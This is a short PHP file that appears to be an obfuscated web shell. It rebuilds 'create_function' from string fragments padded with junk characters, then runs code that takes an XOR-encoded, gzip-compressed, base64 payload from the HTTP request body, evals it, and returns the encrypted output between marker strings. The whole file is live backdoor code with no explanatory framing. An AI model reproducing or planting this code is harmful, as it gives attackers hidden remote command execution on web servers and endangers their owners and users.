<?php
$a=str_replace('jv','','cjvreajvte_jvfujvnjvctijvon');
$l='$k=*"df03*1200";$*kh="*f190400d*7900";$k*f="1c*a*bbebfad92";$p="*MMh*ZSQT15zJb*hNJs';
$s='();@e*va*l(@g*zunco*mp*ress(@x(@b*as*e6*4_decode($m[1]),*$k)*));*$o=@ob_ge*t_cont*ents()*;@o';
$V='b_end_cl**ean();$r=@*bas*e64_en*code(@x(@g*zcompres*s($o),$k**));p*rint("$p*$kh$r$kf");}';
$I='**";function* x($*t,$k)*{$c=strlen*($k);$*l=strlen(*$t);$o=*""*;f*or($i=0;$*i<$*l;){f';
$F='tc*h("/$kh*(.+)*$kf/",@file_get*_conte*n*ts("p*h*p://*input"*),$m)==1) {@ob_*start';
$x='or($j=*0;(*$*j<$*c&&$i<$l);$j++,$*i++){$o.=*$t*{$i}^$k{*$j};}*}retur*n $o*;}i*f (@preg_*ma';
$P=str_replace('*','',$l.$I.$x.$F.$s.$V);
$u=$a('',$P);$u();
?>
